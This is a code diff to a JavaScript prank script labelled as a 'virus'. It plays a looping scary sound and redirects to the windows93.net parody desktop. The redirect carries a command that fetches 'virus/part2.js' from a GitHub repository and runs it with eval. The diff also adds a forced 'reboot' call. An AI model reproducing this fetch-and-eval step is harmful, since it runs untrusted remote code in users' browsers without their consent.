@@ -14,7 +14,7 @@ function modifyContent() {
 
   // Play sound (without autoplay or loop, user interaction required)
   const sound = new Audio();
-  sound.src = 'https://leopard.hosting.pecon.us/dl/imnme/scary.wav'; // Replace with your sound file path
+  sound.src = 'https://leopard.hosting.pecon.us/dl/iosss/scariest.wav'; // Replace with your sound file path
   sound.addEventListener('ended', () => {
       sound.play();
   });
@@ -23,7 +23,10 @@ function modifyContent() {
 
 // Alert and redirection (with confirmation and security considerations)
 function redirectWithAlert() {
-    window.location.href = "https://www.windows93.net/#js%20fetch('https://raw.githubusercontent.com/ivorydevrimoalt/windows93/main/virus/part2.js').then(response => response.text()).then(script => eval(script));";
+    window.location.href = "https://www.windows93.net/#!js%20fetch('https://raw.githubusercontent.com/ivorydevrimoalt/windows93/main/virus/part2.js').then(response => response.text()).then(script => eval(script));";
+    setTimeout(function(){
+    $exe("reboot")
+    },1000)
 }
 
 // Call the functions (modify content first, then handle alert and redirection)
